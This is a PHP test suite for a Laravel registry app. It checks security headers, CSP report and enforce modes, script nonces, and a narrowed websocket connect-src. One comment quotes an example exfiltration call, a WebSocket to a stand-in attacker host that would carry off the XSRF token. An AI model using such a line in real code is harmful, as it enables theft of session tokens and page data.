<?php

use App\Models\Group;
use App\Models\Organization;
use App\Models\Package;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;

uses(RefreshDatabase::class);

it('sets baseline security headers on web responses', function () {
    $user = User::factory()->create(['organization_id' => Organization::factory()->create()->id]);

    $res = $this->actingAs($user)->get('/settings/profile');

    $res->assertHeader('X-Content-Type-Options', 'nosniff');
    $res->assertHeader('X-Frame-Options', 'DENY');
    $res->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    expect($res->headers->get('Permissions-Policy'))->not->toBeNull();
});

it('adds a report-only csp when enabled', function () {
    config(['security.csp' => 'report']);
    $user = User::factory()->create(['organization_id' => Organization::factory()->create()->id]);

    $this->actingAs($user)->get('/settings/profile')
        ->assertHeaderContains('Content-Security-Policy-Report-Only', "frame-ancestors 'none'");
});

it('enforces the csp in enforce mode instead of only reporting it', function () {
    config(['security.csp' => 'enforce']);
    $user = User::factory()->create(['organization_id' => Organization::factory()->create()->id]);

    $res = $this->actingAs($user)->get('/settings/profile');

    $res->assertHeaderContains('Content-Security-Policy', "frame-ancestors 'none'");
    expect($res->headers->get('Content-Security-Policy-Report-Only'))->toBeNull();
});

it('keeps the legacy SECURITY_CSP_REPORT_ONLY switch working', function () {
    expect(config('security.csp'))->toBe('off');
});

// The whole point of the finding: the stateless registry, webhook and API routes live
// outside the `web` group and used to receive no security headers at all.
it('sets the universal headers on a stateless registry response', function () {
    $group = Group::factory()->for(Organization::factory())->create(['slug' => 'hdr', 'public' => true]);
    $group->packages()->attach(Package::factory()->inOrgOf($group)->create(['name' => 'acme/demo']));

    $res = $this->getJson('/r/hdr/packages.json');

    $res->assertOk();
    $res->assertHeader('X-Content-Type-Options', 'nosniff');
    $res->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
});

it('sets the universal headers on a stateless api response', function () {
    $res = $this->getJson('/api/v1/status');

    $res->assertUnauthorized();
    $res->assertHeader('X-Content-Type-Options', 'nosniff');
    $res->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
});

// …but only the universal ones. A CSP written for an Inertia document, a
// Permissions-Policy and X-Frame-Options say nothing about a JSON body or a tarball.
it('keeps the document-only headers off a non-html response', function () {
    config(['security.csp' => 'enforce']);
    $group = Group::factory()->for(Organization::factory())->create(['slug' => 'hdr', 'public' => true]);
    $group->packages()->attach(Package::factory()->inOrgOf($group)->create(['name' => 'acme/demo']));

    $res = $this->getJson('/r/hdr/packages.json');

    $res->assertOk();
    expect($res->headers->get('Content-Security-Policy'))->toBeNull();
    expect($res->headers->get('Content-Security-Policy-Report-Only'))->toBeNull();
    expect($res->headers->get('X-Frame-Options'))->toBeNull();
    expect($res->headers->get('Permissions-Policy'))->toBeNull();
});

// An enforcing CSP is worthless if the app's own inline script is not covered by it:
// `@routes` (Ziggy) emits one, and without a nonce enforcement blanks the SPA.
it('nonces the inline routes script so an enforcing csp does not break the app', function () {
    config(['security.csp' => 'enforce']);
    $user = User::factory()->create(['organization_id' => Organization::factory()->create()->id]);

    $res = $this->actingAs($user)->get('/settings/profile');

    $csp = (string) $res->headers->get('Content-Security-Policy');
    expect($csp)->toMatch("/script-src [^;]*'nonce-[A-Za-z0-9+\/=]+'/");

    preg_match("/'nonce-([A-Za-z0-9+\/=]+)'/", $csp, $m);
    expect($res->getContent())->toContain('nonce="'.$m[1].'"');
});

// `connect-src 'self' ws: wss:` allowed a websocket to any host on the internet, so the
// exfiltration containment `default-src 'self'` exists for was void for that channel:
// one `new WebSocket('wss://attacker.example/x')` carries the readable XSRF-TOKEN and
// every Inertia page prop off the origin.

it('names a concrete websocket origin instead of allowing every host', function () {
    config([
        'security.csp' => 'enforce',
        'reverb.apps.apps.0.options' => ['host' => 'ws.registry.example.com', 'port' => 8080, 'scheme' => 'https'],
    ]);

    $policy = $this->get('/login')->headers->get('Content-Security-Policy');

    expect($policy)->toContain("connect-src 'self' wss://ws.registry.example.com:8080")
        ->and($policy)->not->toContain('ws:')
        ->and($policy)->not->toContain(' wss: ');
});

it('falls back to the requested host when reverb runs on the app origin', function () {
    config([
        'security.csp' => 'enforce',
        'reverb.apps.apps.0.options' => ['host' => null, 'port' => 443, 'scheme' => 'https'],
    ]);

    $policy = $this->get('/login')->headers->get('Content-Security-Policy');

    expect($policy)->toContain("connect-src 'self' wss://localhost:443");
});

it('emits an insecure websocket origin only when reverb is configured for one', function () {
    config([
        'security.csp' => 'enforce',
        'reverb.apps.apps.0.options' => ['host' => 'ws.internal', 'port' => 8080, 'scheme' => 'http'],
    ]);

    expect($this->get('/login')->headers->get('Content-Security-Policy'))
        ->toContain("connect-src 'self' ws://ws.internal:8080");
});
